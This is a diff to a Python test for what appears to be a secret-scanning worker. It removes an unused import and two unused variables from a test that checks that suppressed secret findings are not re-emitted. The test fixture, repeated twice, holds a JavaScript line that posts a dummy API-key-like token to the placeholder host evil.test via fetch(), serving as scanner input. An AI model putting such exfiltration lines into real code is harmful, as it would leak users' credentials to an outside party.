@@ -476,14 +476,13 @@ class TestScanDB:
     async def test_secret_scan_suppressed_fingerprint_not_re_emitted(self):
         """A secret finding with a suppressed fingerprint must not be re-emitted."""
         from sentinel_worker.scan import scan_diff
-        from sentinel_worker.security import compute_fingerprint
         from tests.conftest import MockLLMClient
 
         engine = _engine()
         sm = await _session_factory(engine)
         async with sm() as session:
             async with session.begin():
-                run = await scan_diff(
+                await scan_diff(
                     session,
                     "repo",
                     "+++ b/app.js\n+fetch('https://evil.test', {body: 'sk-Test_1234567890abcdefghijklmnop/QRSTUV'})",
@@ -498,7 +497,7 @@ class TestScanDB:
 
             # Re-scan same content
             async with session.begin():
-                run2 = await scan_diff(
+                await scan_diff(
                     session,
                     "repo",
                     "+++ b/app.js\n+fetch('https://evil.test', {body: 'sk-Test_1234567890abcdefghijklmnop/QRSTUV'})",
